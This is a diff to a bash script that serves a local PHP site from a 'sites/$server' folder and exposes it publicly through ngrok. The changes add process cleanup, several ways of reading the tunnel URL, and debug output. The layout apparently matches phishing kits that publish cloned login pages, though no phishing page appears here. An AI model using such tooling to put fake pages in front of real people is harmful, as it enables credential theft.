@@ -407,34 +407,51 @@ cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 
-# Check if ngrok authtoken is configured
-if ! ./ngrok config check > /dev/null 2>&1; then
-    printf "\e[1;91m[!] Ngrok authtoken not configured!\e[0m\n"
-    printf "\e[1;93m[!] Run: ./ngrok config add-authtoken YOUR_TOKEN\e[0m\n"
-    printf "\e[1;93m[!] Get token from: https://dashboard.ngrok.com/get-started/your-authtoken\e[0m\n"
-    printf "\e[1;93m[!] Or use option 2 (Localtunnel) instead\e[0m\n"
+# Kill any existing ngrok processes
+pkill -f ngrok > /dev/null 2>&1
+
+# Start ngrok (try both methods)
+if [[ -f ./ngrok ]]; then
+    ./ngrok http 127.0.0.1:5555 --log=stdout > /tmp/ngrok.log 2>&1 &
+elif command -v ngrok &> /dev/null; then
+    ngrok http 127.0.0.1:5555 --log=stdout > /tmp/ngrok.log 2>&1 &
+else
+    printf "\e[1;91m[!] Ngrok not found!\e[0m\n"
     exit 1
 fi
 
-./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
-sleep 8
+# Wait for ngrok to start
+printf "\e[1;93m[*] Waiting for ngrok to initialize...\e[0m\n"
+sleep 10
 
 # Try multiple methods to get the link
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok-free\.app")
+link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"https://[^"]*' | grep -o 'https://[^"]*' | head -n 1)
+
 if [[ -z "$link" ]]; then
-    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok\.io")
+    link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o "https://[0-9a-z-]*\.ngrok-free\.app")
 fi
+
 if [[ -z "$link" ]]; then
-    link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -oP '"public_url":"https://\K[^"]+')
+    link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o "https://[0-9a-z-]*\.ngrok\.io")
+fi
+
+# If still no link, try one more time after waiting
+if [[ -z "$link" ]]; then
+    printf "\e[1;93m[*] Retrying...\e[0m\n"
+    sleep 5
+    link=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"https://[^"]*' | grep -o 'https://[^"]*' | head -n 1)
 fi
 
 # If still no link, show debug info
 if [[ -z "$link" ]]; then
     printf "\e[1;91m[!] Failed to get ngrok link!\e[0m\n"
-    printf "\e[1;93m[*] Debug info:\e[0m\n"
-    curl -s http://127.0.0.1:4040/api/tunnels | head -20
-    printf "\e[1;93m[!] Make sure ngrok authtoken is configured\e[0m\n"
-    printf "\e[1;93m[!] Run: ./ngrok config add-authtoken YOUR_TOKEN\e[0m\n"
+    printf "\e[1;93m[*] Debug - Checking ngrok process:\e[0m\n"
+    ps aux | grep ngrok | grep -v grep
+    printf "\e[1;93m[*] Debug - Checking ngrok API:\e[0m\n"
+    curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null
+    printf "\n\e[1;93m[*] Debug - Ngrok logs:\e[0m\n"
+    tail -20 /tmp/ngrok.log 2>/dev/null
+    printf "\e[1;93m[!] Try using option 2 (Localtunnel) instead\e[0m\n"
     exit 1
 fi
 
